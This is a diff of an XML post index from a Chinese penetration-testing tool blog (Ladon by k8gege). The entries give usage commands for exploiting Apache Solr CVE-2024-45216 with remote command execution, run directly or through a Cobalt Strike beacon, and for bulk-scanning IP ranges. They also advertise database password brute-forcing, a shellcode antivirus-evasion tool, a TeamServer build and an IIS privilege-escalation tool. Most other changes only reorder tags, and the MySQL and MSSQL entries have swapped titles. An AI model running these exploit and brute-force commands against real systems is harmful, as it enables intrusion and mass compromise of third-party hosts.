@@ -2820,7 +2820,7 @@ window.location.href="http://k8gege.org/Ladon/LadonGo.html";
   <entry>
     <title>Ladon CVE-2024-45216 漏洞批量扫描教程</title>
     <url>/p/CVE-2024-29973.html</url>
-    <content><![CDATA[<h1 id="Ladon-CVE-2024-29973-Zyxel漏洞批量扫描教程"><a href="#Ladon-CVE-2024-29973-Zyxel漏洞批量扫描教程" class="headerlink" title="Ladon CVE-2024-29973 Zyxel漏洞批量扫描教程"></a>Ladon CVE-2024-29973 Zyxel漏洞批量扫描教程</h1><p>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</p>
+    <content><![CDATA[<h1 id="Ladon-CVE-2024-45216-影响版本-Apache-Solr-5-3-0-lt-Apache-Solr-lt-8-11-4-9-0-0-lt-Apache-Solr-lt-9-7-0"><a href="#Ladon-CVE-2024-45216-影响版本-Apache-Solr-5-3-0-lt-Apache-Solr-lt-8-11-4-9-0-0-lt-Apache-Solr-lt-9-7-0" class="headerlink" title="Ladon CVE-2024-45216 影响版本 Apache Solr 5.3.0 &lt;= Apache Solr &lt; 8.11.4  9.0.0 &lt;= Apache Solr &lt; 9.7.0"></a>Ladon CVE-2024-45216 影响版本 Apache Solr 5.3.0 &lt;= Apache Solr &lt; 8.11.4  9.0.0 &lt;= Apache Solr &lt; 9.7.0</h1><p>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</p>
 <script language="javascript" type="text/javascript">
 window.location.href="http://k8gege.org/Ladon/CVE-2024-45216.html";
 </script>
@@ -2835,6 +2835,7 @@ window.location.href="http://k8gege.org/Ladon/CVE-2024-45216.html";
 <p>PS: 使用LadonExp填上对应内容，即可生成POC/EXP</p>
 <h3 id="POC独立使用"><a href="#POC独立使用" class="headerlink" title="POC独立使用"></a>POC独立使用</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">CVE-2024-45216.exe http://192.168.1.8</span><br></pre></td></tr></table></figure>
 <p>PS: 部分https站点需Ladon调用扫描</p>
+<p><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exp/CVE-2024-45216/poc.png"></p>
 <h3 id="EXP执行命令"><a href="#EXP执行命令" class="headerlink" title="EXP执行命令"></a>EXP执行命令</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">CVE-2024-45216.exe http://192.168.1.8 whoami</span><br></pre></td></tr></table></figure>
 <p>PS: 将payload中的cmd命令如whoami替换成$cmd$ 即可生成EXP</p>
 <h3 id="CS使用POC"><a href="#CS使用POC" class="headerlink" title="CS使用POC"></a>CS使用POC</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">beacon&gt; execute-assembly C:\Ladon\CVE-2024-45216.exe http://192.168.1.8</span><br></pre></td></tr></table></figure>
@@ -2845,6 +2846,7 @@ window.location.href="http://k8gege.org/Ladon/CVE-2024-45216.html";
 
 <h3 id="批量URL"><a href="#批量URL" class="headerlink" title="批量URL"></a>批量URL</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Ladon url.txt CVE-2024-45216.exe</span><br></pre></td></tr></table></figure>
 <p>PS：TXT可存放IP、IP:Port、URL等格式</p>
+<p><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exp/CVE-2024-45216/vul.png"></p>
 <h3 id="批量IP"><a href="#批量IP" class="headerlink" title="批量IP"></a>批量IP</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Ladon ip.txt CVE-2024-45216.exe</span><br><span class="line">Ladon noping ip.txt CVE-2024-45216.exe</span><br></pre></td></tr></table></figure>
 
 <h3 id="指定C段"><a href="#指定C段" class="headerlink" title="指定C段"></a>指定C段</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Ladon 192.168.1.8/24 CVE-2024-45216.exe</span><br><span class="line">Ladon noping 192.168.1.8/24 CVE-2024-45216.exe</span><br><span class="line"></span><br><span class="line">Ladon 192.168.1.8/24 CVE-2024-45216.dll</span><br><span class="line">Ladon noping 192.168.1.8/24 CVE-2024-45216.dll</span><br></pre></td></tr></table></figure>
@@ -2861,12 +2863,12 @@ window.location.href="http://k8gege.org/Ladon/CVE-2024-45216.html";
 <p>PS: TXT存放各种IP网段，全网无差别扫描</p>
 ]]></content>
       <categories>
-        <category>Exp</category>
         <category>Ladon</category>
+        <category>Exp</category>
       </categories>
       <tags>
-        <tag>CVE-2024-29973</tag>
         <tag>Apache Solr</tag>
+        <tag>CVE-2024-29973</tag>
       </tags>
   </entry>
   <entry>
@@ -2923,12 +2925,12 @@ window.location.href="http://k8gege.org/Ladon/CVE-2024-29973.html";
 <h3 id="DownLoad"><a href="#DownLoad" class="headerlink" title="DownLoad"></a>DownLoad</h3><p><a href="https://github.com/k8gege/Ladon/blob/master/CVE-2024-29973.rar" target="_blank" rel="noopener">https://github.com/k8gege/Ladon/blob/master/CVE-2024-29973.rar</a><br><a href="https://github.com/k8gege/Ladon/blob/master/LadonExp.exe" target="_blank" rel="noopener">https://github.com/k8gege/Ladon/blob/master/LadonExp.exe</a></p>
 ]]></content>
       <categories>
-        <category>Exp</category>
         <category>Ladon</category>
+        <category>Exp</category>
       </categories>
       <tags>
-        <tag>Zyxel</tag>
         <tag>CVE-2024-29973</tag>
+        <tag>Zyxel</tag>
       </tags>
   </entry>
   <entry>
@@ -3047,7 +3049,7 @@ window.location.href="http://k8gege.org/Ladon/OracleScan.html";
       </tags>
   </entry>
   <entry>
-    <title>Ladon渗透Mysql数据库一键提权 密码爆破</title>
+    <title>Ladon渗透SQL Server数据库一键提权 密码爆破</title>
     <url>/p/MysqlScan.html</url>
     <content><![CDATA[<p style="color:#fff;"> 
 <% <span class="archive-article-date">
@@ -3058,11 +3060,11 @@ Visit <span id="busuanzi_value_page_pv"></span>
 
 <p>=============================================================================================<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</p>
 <script language="javascript" type="text/javascript">
-window.location.href="http://k8gege.org/Ladon/MysqlScan.html";
+window.location.href="http://k8gege.org/Ladon/MssqlScan.html";
 </script>
 
 
-<h3 id="3306端口-Mysql数据库密码爆破"><a href="#3306端口-Mysql数据库密码爆破" class="headerlink" title="3306端口 Mysql数据库密码爆破"></a>3306端口 Mysql数据库密码爆破</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Ladon 192.168.1.8/24 MysqlScan</span><br></pre></td></tr></table></figure>
+<h3 id="1433端口-Mssql数据库密码爆破"><a href="#1433端口-Mssql数据库密码爆破" class="headerlink" title="1433端口 Mssql数据库密码爆破"></a>1433端口 Mssql数据库密码爆破</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Ladon 192.168.1.8/24 MssqlScan</span><br></pre></td></tr></table></figure>
 
 <p><img alt="image" data-original="http://k8gege.org/k8img/Ladon/MysqlScan_up.png"></p>
 <h4 id="配置密码爆破参数"><a href="#配置密码爆破参数" class="headerlink" title="配置密码爆破参数"></a>配置密码爆破参数</h4><p>1  支持标准的user.txt和pass.txt帐密破解，爆破每个用户都需将密码跑完或跑出正确为此<br>2  支持userpass.txt（存放用户名和对应密码）,用于快速验证其它机器是否存在相同帐密<br>3  支持check.txt（存放IP/端口/库名/用户/密码）,不指定端口和数据库名则使用默认</p>
@@ -3087,7 +3089,7 @@ window.location.href="http://k8gege.org/Ladon/MysqlScan.html";
       </tags>
   </entry>
   <entry>
-    <title>Ladon渗透SQL Server数据库一键提权 密码爆破</title>
+    <title>Ladon渗透Mysql数据库一键提权 密码爆破</title>
     <url>/p/MysqlScan.html</url>
     <content><![CDATA[<p style="color:#fff;"> 
 <% <span class="archive-article-date">
@@ -3098,11 +3100,11 @@ Visit <span id="busuanzi_value_page_pv"></span>
 
 <p>=============================================================================================<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</p>
 <script language="javascript" type="text/javascript">
-window.location.href="http://k8gege.org/Ladon/MssqlScan.html";
+window.location.href="http://k8gege.org/Ladon/MysqlScan.html";
 </script>
 
 
-<h3 id="1433端口-Mssql数据库密码爆破"><a href="#1433端口-Mssql数据库密码爆破" class="headerlink" title="1433端口 Mssql数据库密码爆破"></a>1433端口 Mssql数据库密码爆破</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Ladon 192.168.1.8/24 MssqlScan</span><br></pre></td></tr></table></figure>
+<h3 id="3306端口-Mysql数据库密码爆破"><a href="#3306端口-Mysql数据库密码爆破" class="headerlink" title="3306端口 Mysql数据库密码爆破"></a>3306端口 Mysql数据库密码爆破</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Ladon 192.168.1.8/24 MysqlScan</span><br></pre></td></tr></table></figure>
 
 <p><img alt="image" data-original="http://k8gege.org/k8img/Ladon/MysqlScan_up.png"></p>
 <h4 id="配置密码爆破参数"><a href="#配置密码爆破参数" class="headerlink" title="配置密码爆破参数"></a>配置密码爆破参数</h4><p>1  支持标准的user.txt和pass.txt帐密破解，爆破每个用户都需将密码跑完或跑出正确为此<br>2  支持userpass.txt（存放用户名和对应密码）,用于快速验证其它机器是否存在相同帐密<br>3  支持check.txt（存放IP/端口/库名/用户/密码）,不指定端口和数据库名则使用默认</p>
@@ -3391,8 +3393,8 @@ window.location.href="/Ladon/CVE-2022-36537.html";
 </div>
 ]]></content>
       <categories>
-        <category>Exp</category>
         <category>Ladon</category>
+        <category>Exp</category>
       </categories>
       <tags>
         <tag>Exp</tag>
@@ -6201,8 +6203,8 @@ window.location.href="http://k8gege.org/Ladon/cve-2020-0688.html";
 <h3 id="Ladon下载"><a href="#Ladon下载" class="headerlink" title="Ladon下载"></a>Ladon下载</h3><p>历史版本: <a href="https://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener">https://github.com/k8gege/Ladon/releases</a><br>7.0版本：<a href="https://k8gege.org/Download">https://k8gege.org/Download</a><br>7.5版本：K8小密圈</p>
 ]]></content>
       <categories>
-        <category>Exp</category>
         <category>Ladon</category>
+        <category>Exp</category>
       </categories>
       <tags>
         <tag>CVE-2020-0688</tag>
@@ -6731,11 +6733,11 @@ WIN-OLDM1T2H9M4                     WIN-OLDM1T2H9M4          </code></pre>
 ]]></content>
       <categories>
         <category>Ladon</category>
+        <category>.NET</category>
         <category>主机发现</category>
         <category>源码</category>
-        <category>.NET</category>
-        <category>信息收集</category>
         <category>内网渗透</category>
+        <category>信息收集</category>
         <category>编程</category>
       </categories>
       <tags>
@@ -7245,8 +7247,8 @@ window.location.href="http://k8gege.org/Ladon/sshscan.html";
       <categories>
         <category>Ladon</category>
         <category>主机发现</category>
-        <category>信息收集</category>
         <category>内网渗透</category>
+        <category>信息收集</category>
       </categories>
       <tags>
         <tag>Ladon</tag>
@@ -7679,9 +7681,9 @@ window.location.href="http://k8gege.org/Ladon/sshscan.html";
 <h3 id="0x006-执行效果"><a href="#0x006-执行效果" class="headerlink" title="0x006 执行效果"></a>0x006 执行效果</h3><p><img alt="image" data-original="http://k8gege.org/k8img/Other/ilcode.PNG"></p>
 ]]></content>
       <categories>
+        <category>.NET</category>
         <category>源码</category>
         <category>ShellCode</category>
-        <category>.NET</category>
         <category>编程</category>
       </categories>
       <tags>
@@ -7744,8 +7746,8 @@ window.location.href="http://k8gege.org/Ladon/sshscan.html";
 <h3 id="0x006-视频教程"><a href="#0x006-视频教程" class="headerlink" title="0x006 视频教程"></a>0x006 视频教程</h3><p>Video1: <a href="https://github.com/k8gege/K8CScan/blob/master/Video/K8Cscan%20Apache%20ActiveMQ%20GetShell%20CVE-2016-3088.rar" target="_blank" rel="noopener">K8Cscan Apache ActiveMQ GetShell CVE-2016-3088</a><br><br>Video2: <a href="https://github.com/k8gege/K8CScan/blob/master/Video/K8Cscan%20WhatCMS%20GetShell.rar" target="_blank" rel="noopener">WhatCMS指纹识别内网ActiveMQ&amp;GetShell</a></p>
 ]]></content>
       <categories>
-        <category>Exp</category>
         <category>Ladon</category>
+        <category>Exp</category>
         <category>工具</category>
       </categories>
       <tags>
@@ -7768,8 +7770,8 @@ window.location.href="http://k8gege.org/Ladon/sshscan.html";
 <h3 id="视频教程"><a href="#视频教程" class="headerlink" title="视频教程"></a>视频教程</h3><p>通过EXP生成器将以上Payload转成DLL，使用Ladon即可批量利用,详情请观看视频教程<br><br>Video: <a href="https://github.com/k8gege/K8CScan/blob/master/Video/K8Cscan%20ThinkPHP%205.x%20RCE%20Exploit.rar" target="_blank" rel="noopener">K8Cscan ThinkPHP 5.x RCE Exploit</a><br></p>
 ]]></content>
       <categories>
-        <category>Exp</category>
         <category>Ladon</category>
+        <category>Exp</category>
         <category>工具</category>
       </categories>
       <tags>
@@ -7793,8 +7795,8 @@ window.location.href="http://k8gege.org/Ladon/sshscan.html";
 <p><img alt data-original="https://k8gege.github.io/k8img/Ladon/exp/CVE-2018-2894_3.png"></p>
 ]]></content>
       <categories>
-        <category>Exp</category>
         <category>Ladon</category>
+        <category>Exp</category>
         <category>工具</category>
       </categories>
       <tags>
@@ -7824,8 +7826,8 @@ window.location.href="http://k8gege.org/Ladon/sshscan.html";
 <h3 id="0x005-下载"><a href="#0x005-下载" class="headerlink" title="0x005 下载"></a>0x005 下载</h3><p><a href="https://github.com/k8gege/K8CScan/tree/master/ExpGenerator" target="_blank" rel="noopener">https://github.com/k8gege/K8CScan/tree/master/ExpGenerator</a></p>
 ]]></content>
       <categories>
-        <category>Exp</category>
         <category>Ladon</category>
+        <category>Exp</category>
         <category>工具</category>
       </categories>
       <tags>
@@ -7865,14 +7867,14 @@ window.location.href="http://k8gege.org/Ladon/sshscan.html";
 ]]></content>
       <categories>
         <category>Metasploit</category>
-        <category>PowerShell</category>
         <category>.NET</category>
+        <category>PowerShell</category>
       </categories>
       <tags>
         <tag>Metasploit</tag>
         <tag>PowerShell</tag>
-        <tag>C#</tag>
         <tag>.NET</tag>
+        <tag>C#</tag>
         <tag>MSF</tag>
         <tag>meterpreter</tag>
       </tags>
@@ -8027,8 +8029,8 @@ window.location.href="http://k8gege.org/Ladon/sshscan.html";
 <h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p>Poc: <a href="https://github.com/k8gege/CVE-2019-11043" target="_blank" rel="noopener">https://github.com/k8gege/CVE-2019-11043</a><br>Ladon: <a href="https://github.com/k8gege/Ladon" target="_blank" rel="noopener">https://github.com/k8gege/Ladon</a></p>
 ]]></content>
       <categories>
-        <category>Exp</category>
         <category>Ladon</category>
+        <category>Exp</category>
         <category>工具</category>
       </categories>
       <tags>
@@ -8306,8 +8308,8 @@ window.location.href="http://k8gege.org/Ladon/sshscan.html";
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">using System;</span><br><span class="line">using System.Collections.Generic;</span><br><span class="line">using System.Text;</span><br><span class="line">using System.Net;</span><br><span class="line">using System.Text.RegularExpressions;</span><br><span class="line"></span><br><span class="line">namespace LadonDLL</span><br><span class="line">&#123;</span><br><span class="line">    public class scan</span><br><span class="line">    &#123;</span><br><span class="line">        public static string run(string ip)</span><br><span class="line">        &#123;</span><br><span class="line">            if (string.IsNullOrEmpty(ip))</span><br><span class="line">                return &quot;&quot;;</span><br><span class="line">            else</span><br><span class="line">            &#123;</span><br><span class="line"></span><br><span class="line">                &#x2F;&#x2F;192.11.22.10    Microsoft-IIS&#x2F;10.0      IIS Windows</span><br><span class="line">                &#x2F;&#x2F;192.11.22.1     H3C-Miniware-Webs       ER3200G2系统管理</span><br><span class="line">                return ip + &quot;\t&quot; + getURLbanner(ip) + &quot;\t&quot; + GetTitle(getHtml(&quot;http:&#x2F;&#x2F;&quot; + ip,2));</span><br><span class="line">            </span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        private static string getURLbanner(string url)</span><br><span class="line">        &#123;</span><br><span class="line">            &#x2F;&#x2F;&#x2F;&#x2F;HttpWebResponse res;</span><br><span class="line">            if (!url.ToLower().Contains(&quot;https:&#x2F;&#x2F;&quot;) &amp;&amp; !url.ToLower().Contains(&quot;http:&#x2F;&#x2F;&quot;))</span><br><span class="line">                url &#x3D; &quot;http:&#x2F;&#x2F;&quot; + url;</span><br><span class="line"></span><br><span class="line">            try</span><br><span class="line">            &#123;</span><br><span class="line">                var req &#x3D; (HttpWebRequest)WebRequest.CreateDefault(new Uri(url));</span><br><span class="line">                req.Method &#x3D; &quot;HEAD&quot;;</span><br><span class="line">                req.Timeout &#x3D; 1000;</span><br><span class="line">                var res &#x3D; (HttpWebResponse)req.GetResponse();</span><br><span class="line"></span><br><span class="line">                if (res.StatusCode &#x3D;&#x3D; HttpStatusCode.OK || res.StatusCode &#x3D;&#x3D; HttpStatusCode.Forbidden || res.StatusCode &#x3D;&#x3D; HttpStatusCode.Redirect || res.StatusCode &#x3D;&#x3D; HttpStatusCode.MovedPermanently)</span><br><span class="line">                &#123;</span><br><span class="line">                    return res.Server;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                &#x2F;&#x2F;res.Close();</span><br><span class="line"></span><br><span class="line">                return res.Server;</span><br><span class="line">            &#125;</span><br><span class="line">            catch (WebException ex)</span><br><span class="line">            &#123;</span><br><span class="line">                return &quot;&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        private static string GetTitle(string html)</span><br><span class="line">        &#123;</span><br><span class="line">            if (html.Contains(&quot;&lt;hTmlKErRor&gt;&quot;))</span><br><span class="line">            &#123;</span><br><span class="line">                &#x2F;&#x2F;return html.Replace(&quot;&lt;hTmlKErRor&gt;&quot;, &quot;&quot;);</span><br><span class="line">                return &quot;&quot;;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            html &#x3D; html.Replace(&quot;&lt;br&gt;&quot;, &quot;&quot;);</span><br><span class="line">            html &#x3D; html.Replace(&quot;&lt;BR&gt;&quot;, &quot;&quot;);</span><br><span class="line">            html &#x3D; html.Replace(&quot;\r\n&quot;, &quot;&quot;);</span><br><span class="line">            html &#x3D; html.Replace(&quot;&amp;nbsp;&quot;, &quot; &quot;);</span><br><span class="line">            html &#x3D; html.Replace(&quot;\n&quot;, &quot;&quot;).Trim();</span><br><span class="line"></span><br><span class="line">            String regex &#x3D; @&quot;&lt;title.+&lt;&#x2F;title&gt;&quot;;</span><br><span class="line"></span><br><span class="line">            String title &#x3D; Regex.Match(html, regex).ToString();</span><br><span class="line">            title &#x3D; Regex.Replace(title, @&quot;[\&quot;&quot;]+&quot;, &quot;&quot;);</span><br><span class="line"></span><br><span class="line">            title &#x3D; title.TrimStart(&#39;&lt;&#39;);</span><br><span class="line"></span><br><span class="line">            string regex2 &#x3D; @&quot;&gt;.+&lt;&#x2F;title&gt;&quot;;</span><br><span class="line"></span><br><span class="line">            string title2 &#x3D; Regex.Match(title, regex2).ToString();</span><br><span class="line">            title2 &#x3D; title2.TrimStart(&#39;&gt;&#39;).Replace(&quot;&lt;&#x2F;title&gt;&quot;, &quot;&quot;).Trim();</span><br><span class="line"></span><br><span class="line">            if (title2.Length &gt; 50)</span><br><span class="line">                return title2.Substring(0, 50);</span><br><span class="line"></span><br><span class="line">            return title2;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        private static string getHtml(string url, int codingType)</span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">            try</span><br><span class="line">            &#123;</span><br><span class="line">                if (!url.ToLower().Contains(&quot;https:&#x2F;&#x2F;&quot;) &amp;&amp; !url.ToLower().Contains(&quot;http:&#x2F;&#x2F;&quot;))</span><br><span class="line">                    url &#x3D; &quot;http:&#x2F;&#x2F;&quot; + url;</span><br><span class="line">                WebClient myWebClient &#x3D; new WebClient();</span><br><span class="line">                if (url.ToLower().Contains(&quot;https:&#x2F;&#x2F;&quot;))</span><br><span class="line">                &#123;</span><br><span class="line">                    System.Net.ServicePointManager.ServerCertificateValidationCallback +&#x3D;</span><br><span class="line">    delegate(object sender, System.Security.Cryptography.X509Certificates.X509Certificate certificate,</span><br><span class="line">             System.Security.Cryptography.X509Certificates.X509Chain chain,</span><br><span class="line">             System.Net.Security.SslPolicyErrors sslPolicyErrors)</span><br><span class="line">    &#123;</span><br><span class="line">        return true; &#x2F;&#x2F; **** Always accept</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                byte[] myDataBuffer &#x3D; myWebClient.DownloadData(url);</span><br><span class="line">                &#x2F;&#x2F;return Encoding.Default.GetString(myDataBuffer);</span><br><span class="line">                string strWebData &#x3D; System.Text.Encoding.Default.GetString(myDataBuffer);</span><br><span class="line"></span><br><span class="line">                &#x2F;&#x2F;自动识别编码  不一定有&lt;meta  比如 百度开放平台 content&#x3D;&quot;text&#x2F;html; charset&#x3D;gbk&quot;&gt;</span><br><span class="line">                &#x2F;&#x2F;Match charSetMatch &#x3D; Regex.Match(strWebData, &quot;&lt;meta([^&gt;]*)charset&#x3D;(\&quot;)?(.*)?\&quot;&quot;, RegexOptions.IgnoreCase | RegexOptions.Multiline);</span><br><span class="line">                Match charSetMatch &#x3D; Regex.Match(strWebData, &quot;(.*)charset&#x3D;(\&quot;)?(.*)?\&quot;&quot;, RegexOptions.IgnoreCase | RegexOptions.Multiline);</span><br><span class="line"></span><br><span class="line">                string webCharSet &#x3D; charSetMatch.Groups[3].Value.Trim().ToLower();</span><br><span class="line"></span><br><span class="line">                if (webCharSet !&#x3D; &quot;gb2312&quot; &amp;&amp; webCharSet !&#x3D; &quot;gbk&quot;)</span><br><span class="line">                &#123;</span><br><span class="line">                    webCharSet &#x3D; &quot;utf-8&quot;;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                if (System.Text.Encoding.GetEncoding(webCharSet) !&#x3D; System.Text.Encoding.Default)</span><br><span class="line">                &#123;</span><br><span class="line">                    strWebData &#x3D; System.Text.Encoding.GetEncoding(webCharSet).GetString(myDataBuffer);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                &#x2F;&#x2F;if (codingType &#x3D;&#x3D; 1)</span><br><span class="line">                &#x2F;&#x2F;    return Encoding.Unicode.GetString(myDataBuffer);</span><br><span class="line">                &#x2F;&#x2F;else if (codingType &#x3D;&#x3D; 2)</span><br><span class="line">                &#x2F;&#x2F;    return Encoding.Default.GetString(myDataBuffer);&#x2F;&#x2F;GBK 936</span><br><span class="line">                &#x2F;&#x2F;else if (codingType &#x3D;&#x3D; 3)</span><br><span class="line">                &#x2F;&#x2F;    return Encoding.UTF8.GetString(myDataBuffer);&#x2F;&#x2F;65501</span><br><span class="line"></span><br><span class="line">                return strWebData;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">            catch (Exception ex)</span><br><span class="line">            &#123;</span><br><span class="line">                &#x2F;&#x2F;Console.WriteLine(url + &quot; &quot; + ex.Message);</span><br><span class="line">                return &quot;&lt;hTmlKErRor&gt;&quot; + ex.Message;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            return &quot;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
       <categories>
         <category>Ladon</category>
-        <category>主机发现</category>
         <category>.NET</category>
+        <category>主机发现</category>
         <category>信息收集</category>
       </categories>
       <tags>
@@ -8327,8 +8329,8 @@ window.location.href="http://k8gege.org/Ladon/sshscan.html";
       <categories>
         <category>Ladon</category>
         <category>工具</category>
-        <category>源码</category>
         <category>.NET</category>
+        <category>源码</category>
         <category>编程</category>
       </categories>
       <tags>
@@ -8349,8 +8351,8 @@ window.location.href="http://k8gege.org/Ladon/sshscan.html";
 <h3 id="Download"><a href="#Download" class="headerlink" title="Download"></a>Download</h3><p><a href="https://github.com/k8gege/MS17010EXP" target="_blank" rel="noopener">https://github.com/k8gege/MS17010EXP</a></p>
 ]]></content>
       <categories>
-        <category>Exp</category>
         <category>Ladon</category>
+        <category>Exp</category>
       </categories>
       <tags>
         <tag>Exp</tag>
@@ -8461,6 +8463,26 @@ Microsoft Windows 10 for 32-bit Systems 0
       </tags>
   </entry>
   <entry>
+    <title>Cobalt Strike TeamServer For Windows</title>
+    <url>/p/22e5f4a8.html</url>
+    <content><![CDATA[<p><img alt data-original="http://k8gege.org/k8img/posts/TeamServer.png"></p>
+<p><strong>Cobalt Strike 3.x TeamServer for Windows<br></strong></p>
+<p><strong>0x001 环境</strong><br><br>CS 3.12 或 3.13 </p>
+<p>Kali或Win最好安装jdk1.8.5或之后版本<br><br>设置环境变量,如path=C:\Program Files\Java\jdk1.8.0_05\bin<br><br><strong>0x002 启动中转</strong><br>启动TeamServer.exe(第一次运行Win7后系统需右键管理员)<br><br>TeamServer.exe IP pass</p>
+<p><span style="color: #ff00ff;">20190306编译版无需kali下生成cobaltstrike.store文件</span></p>
+<p><strong>0x003 下载</strong></p>
+<p>TeamServer.exe</p>
+<p><a href="https://github.com/k8gege/K8tools" target="_blank">https://github.com/k8gege/K8tools/raw/master/TeamServer.exe</a></p>]]></content>
+      <categories>
+        <category>工具</category>
+        <category>Cobalt Strike</category>
+      </categories>
+      <tags>
+        <tag>Tool</tag>
+        <tag>Cobalt Strike</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>CobaltStrike &amp; Metasploit Shellcode一键免杀工具</title>
     <url>/p/9cffe32c.html</url>
     <content><![CDATA[<p><span style="font-size: 18px;"><strong>0x001 前言</strong></span></p>
@@ -8479,34 +8501,14 @@ Microsoft Windows 10 for 32-bit Systems 0
       <categories>
         <category>工具</category>
         <category>免杀</category>
-        <category>Cobalt Strike</category>
         <category>Metasploit</category>
+        <category>Cobalt Strike</category>
         <category>ShellCode</category>
       </categories>
       <tags>
         <tag>Tool</tag>
         <tag>Cobalt Strike</tag>
         <tag>Metasploit</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Cobalt Strike TeamServer For Windows</title>
-    <url>/p/22e5f4a8.html</url>
-    <content><![CDATA[<p><img alt data-original="http://k8gege.org/k8img/posts/TeamServer.png"></p>
-<p><strong>Cobalt Strike 3.x TeamServer for Windows<br></strong></p>
-<p><strong>0x001 环境</strong><br><br>CS 3.12 或 3.13 </p>
-<p>Kali或Win最好安装jdk1.8.5或之后版本<br><br>设置环境变量,如path=C:\Program Files\Java\jdk1.8.0_05\bin<br><br><strong>0x002 启动中转</strong><br>启动TeamServer.exe(第一次运行Win7后系统需右键管理员)<br><br>TeamServer.exe IP pass</p>
-<p><span style="color: #ff00ff;">20190306编译版无需kali下生成cobaltstrike.store文件</span></p>
-<p><strong>0x003 下载</strong></p>
-<p>TeamServer.exe</p>
-<p><a href="https://github.com/k8gege/K8tools" target="_blank">https://github.com/k8gege/K8tools/raw/master/TeamServer.exe</a></p>]]></content>
-      <categories>
-        <category>工具</category>
-        <category>Cobalt Strike</category>
-      </categories>
-      <tags>
-        <tag>Tool</tag>
-        <tag>Cobalt Strike</tag>
       </tags>
   </entry>
   <entry>
@@ -8642,8 +8644,8 @@ Microsoft Windows 10 for 32-bit Systems 0
         <category>Ladon</category>
         <category>工具</category>
         <category>源码</category>
-        <category>Python</category>
         <category>编程</category>
+        <category>Python</category>
       </categories>
       <tags>
         <tag>Ladon</tag>
@@ -8793,8 +8795,8 @@ ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
       <categories>
         <category>工具</category>
         <category>免杀</category>
-        <category>Cobalt Strike</category>
         <category>Metasploit</category>
+        <category>Cobalt Strike</category>
         <category>ShellCode</category>
         <category>Python</category>
       </categories>
@@ -8926,8 +8928,8 @@ payload5='\x23\x64\x61\x74\x65\x3A\x20\x32\x30\x31\x39\x30\x36\x32\x36\x20\x23\x
       </categories>
       <tags>
         <tag>Exp</tag>
-        <tag>Tool</tag>
         <tag>Code</tag>
+        <tag>Tool</tag>
         <tag>GetShell</tag>
       </tags>
   </entry>
@@ -9078,8 +9080,8 @@ xxe_data = r"""&lt;!DOCTYPE Autodiscover [
 <p>Cscan: <a href="https://www.cnblogs.com/k8gege/p/10519321.html" target="_blank">https://www.cnblogs.com/k8gege/p/10519321.html</a></p>
 <p>MSF:&nbsp;&nbsp;<a href="https://github.com/k8gege/ZimbraExploit" target="_blank"> https://github.com/k8gege/ZimbraExploit</a></p>]]></content>
       <categories>
-        <category>Exp</category>
         <category>Ladon</category>
+        <category>Exp</category>
         <category>工具</category>
       </categories>
       <tags>
@@ -9185,6 +9187,33 @@ exploit(dip, dport, &quot;&quot;, &quot;&quot;, &quot;&quot;, &quot;&quot;)</cod
       </tags>
   </entry>
   <entry>
+    <title>全版本IIS提权工具iislpe</title>
+    <url>/p/6b9b3afe.html</url>
+    <content><![CDATA[<p><strong>工具: </strong>iislpe.exe<strong><br></strong></p>
+<p><strong>编译: </strong><a href="https://www.cnblogs.com/k8gege" target="_blank">.</a>net 3.5 </p>
+<p>　　全版本IIS提权工具<a href="https://www.cnblogs.com/k8gege" target="_blank">,</a>支持IIS应用池用户/网络服务用户/本地服务用户</p>
+<p><strong>原理:</strong></p>
+<p><em>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </em>通过NTLM重放将权限提升至SYSTEM权限,详情参考Potato。</p>
+<p><strong>用法:</strong></p>
+<p>IIS Priviledge by k8gege<br>IIS APPPOOL / Network Service / Local Service<br>Us<a href="https://www.cnblogs.com/k8gege/" target="_blank">e</a>age:<br>iislpe c<a href="https://www.cnblogs.com/k8gege/p/10389522.html" target="_blank">:</a>\any.bat<br>iislpe c:\any.exe</p>
+<p><a href="https://www.cnblogs.com/k8gege/p/10389522.html" target="_blank"><img alt data-original="http://k8gege.org/k8img/posts/iislpe.png"></a></p>
